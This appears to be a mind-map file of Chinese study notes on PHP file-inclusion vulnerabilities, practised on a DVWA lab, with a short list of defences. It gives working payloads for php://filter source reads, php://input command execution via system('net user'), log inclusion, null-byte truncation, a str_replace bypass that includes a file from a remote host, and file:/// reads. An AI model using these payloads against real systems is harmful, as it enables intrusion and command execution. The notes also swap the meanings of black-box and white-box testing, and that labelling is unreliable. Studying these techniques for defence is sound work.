{"root":{"data":{"id":"d6p1l8jhr1k0","created":1735562584856,"text":"文件包含"},"children":[{"data":{"id":"d6p1lmb0m000","created":1735562614819,"text":"文件包含简介","layout_mind_offset":{"x":5,"y":-38}},"children":[{"data":{"id":"d6p1mbhw5w00","created":1735562669654,"text":"包含原理"},"children":[{"data":{"id":"d6p1moo817s0","created":1735562698335,"text":"程序员开发的时候，未对包含的文件进行严格过\n滤，攻击者可构造自己的图片木马文件当作脚本\n执行","layout_right_offset":{"x":54,"y":-14}},"children":[]}]},{"data":{"id":"d6p1mbzrzvc0","created":1735562670736,"text":"分类","layout_right_offset":{"x":2,"y":-19}},"children":[{"data":{"id":"d6p1mxcd72w0","created":1735562717209,"text":"1.本地包含"},"children":[]},{"data":{"id":"d6p1mxcdobk0","created":1735562717210,"text":"2.远程包含 条件","layout_right_offset":{"x":2,"y":-29}},"children":[{"data":{"id":"d6p1n4ixa3k0","created":1735562732843,"text":"allow_url_include=on"},"children":[]},{"data":{"id":"d6p1n4ixen40","created":1735562732843,"text":"magic_quotes_gpc=off"},"children":[]},{"data":{"id":"d6p1n4ixayg0","created":1735562732843,"text":"php版本低于5.3.4"},"children":[]}]}]},{"data":{"id":"d6p1mcrkct40","created":1735562672416,"text":"如何快速挖包涵漏洞","layout_right_offset":{"x":4,"y":-25}},"children":[{"data":{"id":"d6p1njox61k0","created":1735562765858,"text":"直接找源代码里面的4函数include0),include\nonce(),require()和require_once0.","layout_right_offset":{"x":1,"y":-21}},"children":[]},{"data":{"id":"d6p1nkcdoa80","created":1735562767276,"text":"include(),include_once()包含的文件有代码错误\n也会执行，require()和require_once()遇到错误\n退出.","layout_right_offset":{"x":2,"y":0}},"children":[]}]}]},{"data":{"id":"d6p1lmrjlwo0","created":1735562615818,"text":"包含漏洞能做什么"},"children":[{"data":{"id":"d6p1o6vgurc0","created":1735562816319,"text":"读文件","layout_right_offset":{"x":10,"y":-54}},"children":[{"data":{"id":"d6p1obg6uko0","created":1735562826279,"text":"有特殊字符一定要转化为base64\n因为用php协议来读文件时如果遇到特殊字符就\n会产生报错"},"children":[{"data":{"id":"d6p1ogytke00","created":1735562838290,"text":"例如:http://192.168.1.55:8080/dvwa/\nvulnerabilities/fi/?page=php://filter/read=\nconvert.base64-encode/resource=x.php"},"children":[]}]}]},{"data":{"id":"d6p1oaiccpc0","created":1735562824233,"text":"写文件/命令执行","layout_right_offset":{"x":-1,"y":-19}},"children":[{"data":{"id":"d6p1pvp1i2g0","created":1735562948715,"text":"1: allow url include为on\n2:在C:\\php\\php-5.2.14-Win32下找到php.ini\n打开，查找display funtions=proc-open,\noppen,exec,system.....删掉system重启\napache","layout_right_offset":{"x":-20,"y":-33}},"children":[{"data":{"id":"d6p1q504oko0","created":1735562968976,"text":"http://192.168.1.55:8080/dvwa/\nvulnerabilities/fi/?page=php://input,并且提交\npost数据包为:<?php system('net user');?>","layout_right_offset":{"x":1,"y":-3}},"children":[]}]}]},{"data":{"id":"d6p1qdhmkrk0","created":1735562987448,"text":"包含绕过"},"children":[{"data":{"id":"d6p1qmjmn8w0","created":1735563007160,"text":"包含日志文件","layout_right_offset":{"x":-9,"y":-41}},"children":[{"data":{"id":"d6p1qyjbrfk0","created":1735563033263,"text":"\\logs\\access.log","layout_right_offset":{"x":-7,"y":-1}},"children":[]}]},{"data":{"id":"d6p1qxn1l7k0","created":1735563031311,"text":"截断包含(%00)","layout_right_offset":{"x":-10,"y":-43}},"children":[{"data":{"id":"d6p1r9ha12w0","created":1735563057084,"text":"这种方法只适合于magic quotes gpc=off的时\n候，在PHP 5.3.4版本之前也是存在着一些其他的\n截断问题","layout_right_offset":{"x":4,"y":-13}},"children":[]}]},{"data":{"id":"d6p1qnyy8ts0","created":1735563010264,"text":"str_replace函数绕过","layout_right_offset":{"x":-6,"y":-49}},"children":[{"data":{"id":"d6p1rngzlf40","created":1735563087542,"text":"双写法"},"children":[]}]},{"data":{"id":"d6p1qo1evs00","created":1735563010412,"text":"nmatch函数绕过","layout_right_offset":{"x":0,"y":-46}},"children":[{"data":{"id":"d6p1ryt9oxs0","created":1735563112229,"text":"file开头 就可以绕过这个函数"},"children":[]}]},{"data":{"id":"d6p1sg8dsu80","created":1735563150148,"text":"不同协议绕过","layout_right_offset":{"x":5,"y":-69}},"children":[{"data":{"id":"d6p1skwfp7c0","created":1735563160309,"text":"http/https"},"children":[]},{"data":{"id":"d6p1so55io00","created":1735563167367,"text":"file"},"children":[]},{"data":{"id":"d6p1so7w4cw0","created":1735563167533,"text":"php"},"children":[]},{"data":{"id":"d6p1sobbyzc0","created":1735563167741,"text":"ssh2"},"children":[]}]}]},{"data":{"id":"d6p1u3nyb5c0","created":1735563279521,"text":"防范","layout_right_offset":{"x":29,"y":-95}},"children":[{"data":{"id":"d6p1u7hfhm00","created":1735563287832,"text":"文件包含参数写死"},"children":[]},{"data":{"id":"d6p1u7hf8080","created":1735563287832,"text":"文件包含参数不可由用户修改"},"children":[]},{"data":{"id":"d6p1u7hf15s0","created":1735563287832,"text":"禁用目录跳转字符\"../\""},"children":[]},{"data":{"id":"d6p1u7hf8tc0","created":1735563287832,"text":"使用文件验证白名单"},"children":[]},{"data":{"id":"d6p1u7hf6ew0","created":1735563287832,"text":"当需要远程包含文件时，可以下载到本地"},"children":[]}]}]},{"data":{"id":"d6p1lmu610o0","created":1735562615977,"text":"特征码","layout_mind_offset":{"x":43,"y":-1}},"children":[{"data":{"id":"d6p1uh7cyso0","created":1735563308991,"text":"参数后面存在XXjpg文件 ","layout_left_offset":{"x":-17,"y":-5}},"children":[{"data":{"id":"d6p1vdu3fxc0","created":1735563380023,"text":"一般是解析图片中的木马代码"},"children":[]}]},{"data":{"id":"d6p1ui0vcco0","created":1735563310776,"text":"读文件","layout_left_offset":{"x":-28,"y":0}},"children":[{"data":{"id":"d6p1vj3uqow0","created":1735563391497,"text":"http://ip:port/fi/?page=php://filter/read=\nconvert.base64-encode/resource=x.php","layout_left_offset":{"x":-23,"y":-4}},"children":[]}]},{"data":{"id":"d6p1ui37rvc0","created":1735563310917,"text":"写文件/命令执行","layout_left_offset":{"x":-33,"y":1}},"children":[{"data":{"id":"d6p1vw8ya280","created":1735563420103,"text":"http://ip:port/fi/?page=php://input\npost包\n里面存在<?php system('net user');?>","layout_left_offset":{"x":-9,"y":-3}},"children":[]}]},{"data":{"id":"d6p1ui5pgvc0","created":1735563311068,"text":"str_replace函数绕过","layout_left_offset":{"x":-16,"y":0}},"children":[{"data":{"id":"d6p1wpnpyow0","created":1735563484123,"text":"http://ip:port/fi/?page=htthttp://p://192.168.\n5.12/phpinfo.txt","layout_left_offset":{"x":13,"y":-6}},"children":[]}]},{"data":{"id":"d6p1ui8ltqo0","created":1735563311243,"text":"fnmatch函数绕过"},"children":[{"data":{"id":"d6p1wx9vw6w0","created":1735563500701,"text":"http://ip:port/fi/?page=file:///C:/xampp/\nhtdocs/dvwa/php.ini","layout_left_offset":{"x":-29,"y":-3}},"children":[]}]},{"data":{"id":"d6p1yp036mo0","created":1735563639422,"text":"黑盒测试"},"children":[{"data":{"id":"d6p1z3a3leg0","created":1735563670503,"text":"从源代码里找include(),include_once()\nrequire()和require_once()这四个函数","layout_left_offset":{"x":-92,"y":-12}},"children":[]}]},{"data":{"id":"d6p1yp7hyxs0","created":1735563639871,"text":"白盒测试","layout_left_offset":{"x":-2,"y":-4}},"children":[{"data":{"id":"d6p1zep74nc0","created":1735563695360,"text":"从URL栏里看是否存在一些参数,","layout_left_offset":{"x":-26,"y":-9}},"children":[]}]}]}]},"template":"default","theme":"fresh-blue","version":"1.4.43"}